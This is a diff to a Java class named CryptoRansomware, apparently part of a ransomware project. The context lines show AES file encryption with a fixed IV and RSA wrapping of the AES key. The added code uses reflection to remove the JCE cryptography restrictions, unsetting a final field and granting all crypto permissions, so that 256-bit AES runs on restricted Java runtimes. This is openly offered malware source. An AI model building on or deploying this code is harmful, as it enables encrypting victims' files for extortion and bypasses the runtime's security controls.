@@ -7,8 +7,11 @@ import javax.crypto.*;
 import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.Modifier;
 import java.security.*;
 import java.sql.SQLException;
+import java.util.Map;
 
 public class CryptoRansomware {
 
@@ -18,6 +21,10 @@ public class CryptoRansomware {
     private final static int AES_Key_Size = 256;
     private final static String Instance = "AES/CFB8/NoPadding";
     private static byte[] ivBytes = new byte[]{0x15, 0x14, 0x13, 0x12, 0x11, 0x10, 0x09, 0x08, 0x07, 0x06, 0x05, 0x04, 0x03, 0x02, 0x01, 0x00};
+
+    static {
+        removeCryptographyRestrictions();
+    }
 
     public static void EncryptFile(final File in, final File out, final SecretKeySpec aeskeySpec) {
         try {
@@ -172,4 +179,43 @@ public class CryptoRansomware {
         return Encrypt(RsaKeyReader.loadPublicKey(pubkey), AesKeyspec);
     }
 
+    private static void removeCryptographyRestrictions() {
+        if (!isRestrictedCryptography()) {
+            System.out.println("Cryptography restrictions removal not needed");
+            return;
+        }
+        try {
+
+            final Class<?> jceSecurity = Class.forName("javax.crypto.JceSecurity");
+            final Class<?> cryptoPermissions = Class.forName("javax.crypto.CryptoPermissions");
+            final Class<?> cryptoAllPermission = Class.forName("javax.crypto.CryptoAllPermission");
+
+            final Field isRestrictedField = jceSecurity.getDeclaredField("isRestricted");
+            isRestrictedField.setAccessible(true);
+            final Field modifiersField = Field.class.getDeclaredField("modifiers");
+            modifiersField.setAccessible(true);
+            modifiersField.setInt(isRestrictedField, isRestrictedField.getModifiers() & ~Modifier.FINAL);
+            isRestrictedField.set(null, false);
+
+            final Field defaultPolicyField = jceSecurity.getDeclaredField("defaultPolicy");
+            defaultPolicyField.setAccessible(true);
+            final PermissionCollection defaultPolicy = (PermissionCollection) defaultPolicyField.get(null);
+
+            final Field perms = cryptoPermissions.getDeclaredField("perms");
+            perms.setAccessible(true);
+            ((Map<?, ?>) perms.get(defaultPolicy)).clear();
+
+            final Field instance = cryptoAllPermission.getDeclaredField("INSTANCE");
+            instance.setAccessible(true);
+            defaultPolicy.add((Permission) instance.get(null));
+
+            System.out.println("Successfully removed cryptography restrictions");
+        } catch (final Exception e) {
+            System.out.println("Failed to remove cryptography restrictions" + e);
+        }
+    }
+
+    private static boolean isRestrictedCryptography() {
+        return "Java(TM) SE Runtime Environment".equals(System.getProperty("java.runtime.name"));
+    }
 }
